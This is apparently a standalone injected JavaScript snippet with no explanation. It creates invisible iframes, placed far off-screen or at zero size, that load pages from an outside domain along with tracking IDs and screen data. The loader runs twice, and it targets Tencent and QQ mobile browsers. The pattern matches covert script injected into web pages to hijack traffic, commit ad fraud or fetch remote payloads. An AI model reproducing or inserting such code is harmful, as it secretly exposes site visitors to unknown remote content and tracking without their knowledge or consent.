window.curNode = document.currentScript || (function() {
    var script = document.querySelectorAll('script');
    return script[script.length - 1]
})();
var s_w = window.screen.width;

var trackid = '10177';
var trackidmd5 = '514fa681c16305230c16dbb26aab1144';
var statid = '1279446583'

var core_url = '//etc.6187wo.com/'+trackid+'/'+trackidmd5+'/Core.html#s_w='+s_w;
function Core(url) {
    var d = document.createElement("div");
    var c = document.createElement("iframe");
    c.src = url;
    window.curNode.parentNode.appendChild(d);
    d.style.position = 'absolute';
    d.style.left = '-40000px';
    d.style.top = '-40000px';
    d.style.width = '100%';
    d.style.height = '1000px';
    d.appendChild(c);
    c.style.width = '100%';
    c.style.height = '100%';
}
function Statistics(cnzz_id) {
    var tua = navigator.userAgent.toLocaleLowerCase();
    if ( - 1 !== tua.indexOf("tbs/") || -1 !== tua.indexOf("mqqbrowser/")) {
        var frame = document.createElement('iframe');
        frame.id = 'cnzz_frame_' + trackid;
        frame.style.cssText = 'position:absolute;left:0;top:0;width:0;height:0;visibility:hidden;';
        frame.frameBorder = '0';
        frame.src = '//etc.6187wo.com/act.html#web_id=' + cnzz_id;
        try {
            document.body.appendChild(frame);
        } catch(e) {}
    }
}
Core(core_url);
Core(core_url);
Statistics(statid);